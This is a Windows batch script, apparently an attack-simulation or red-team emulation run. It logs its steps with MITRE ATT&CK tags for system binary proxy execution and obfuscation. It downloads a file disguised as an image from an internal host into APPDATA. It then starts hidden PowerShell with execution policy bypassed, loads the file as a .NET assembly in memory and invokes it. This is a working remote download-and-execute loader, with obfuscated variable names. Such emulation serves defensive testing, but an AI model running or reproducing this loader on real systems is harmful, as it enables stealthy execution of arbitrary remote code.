@echo off
SETLOCAL EnableDelayedExpansion

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Placeholder constant declarations (random-named SET vars)
SET akjdh=%APPDATA%\10926\ef4a4f6d
SET mnbvf=wimrar.txt
SET qwzxc=https://10.0.0.49/stage/2/icon.png?10926-7
SET plkmj=ITZEL-S2BO
SET vbnmc=10926
SET ghzxp=7
SET xcvaq=%PUBLIC%\\macula-simulations.log

REM Initialize error tracking
SET errflag=0
SET errmsg=

REM ---- Step 1: Heartbeat fetch ----
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: heartbeat_start>> "!xcvaq!" 2>nul
curl -k -s -o "!akjdh!\!mnbvf!" "!qwzxc!"
IF NOT !errorlevel!==0 (
    SET errflag=1
    IF "!errmsg!"=="" SET errmsg=heartbeat_fail
)
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: heartbeat_complete>> "!xcvaq!" 2>nul

REM ---- Step 2: Change working directory ----
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: chdir_start>> "!xcvaq!" 2>nul
cd /d "!akjdh!" >nul 2>&1
SET chdir_ret=!errorlevel!
IF NOT !chdir_ret!==0 (
    SET errflag=1
    IF "!errmsg!"=="" SET errmsg=chdir_fail
)
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: chdir_result=!chdir_ret!>> "!xcvaq!" 2>nul

REM ---- Step 3: Invoke Stage 2 Loader DLL via PowerShell ----
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: ps_start>> "!xcvaq!" 2>nul
powershell.exe -nop -w hidden -ep bypass -Command "& { $a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%APPDATA%\10926\ef4a4f6d\wimrar.txt')); ($a.GetExportedTypes()|%{$_.GetMethods([Reflection.BindingFlags]'Public,Static')|?{$_.GetParameters().Count -eq 0}}|Select -First 1).Invoke($null,$null) }"
IF NOT !errorlevel!==0 (
    SET errflag=1
    IF "!errmsg!"=="" SET errmsg=ps_fail
)
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: ps_complete>> "!xcvaq!" 2>nul

REM ---- Log TTP results ----
IF !errflag!==0 (
    SET res=OK
    SET errdet=
) ELSE (
    SET res=FAIL
    SET errdet=!errmsg!
)

echo [!tsvar!][TTP][%plkmj%][%vbnmc%]: T1218^|System Binary Proxy Execution=!res!:!errdet!>> "!xcvaq!" 2>nul
echo [!tsvar!][TTP][%plkmj%][%vbnmc%]: T1027^|Obfuscated Files or Information=!res!:!errdet!>> "!xcvaq!" 2>nul

ENDLOCAL
exit /b 0